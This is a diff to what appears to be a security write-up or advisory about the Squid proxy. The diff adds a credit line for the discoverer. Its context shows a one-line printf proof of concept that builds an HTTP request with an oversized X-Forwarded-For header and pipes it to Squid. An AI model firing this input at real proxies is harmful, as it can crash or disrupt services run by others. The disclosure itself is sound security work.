@@ -140,3 +140,6 @@ Alternatively, you can simply run this script:
 printf "GET http://google.com/ HTTP/1.1\r\nX-Forwarded-For: `perl -e 'print ",1" x 5000'`\r\n\r\n"
 ```
 and pipe the output to Squid.
+
+
+This issue was discovered by [Joshua Rogers](https://joshua.hu/).
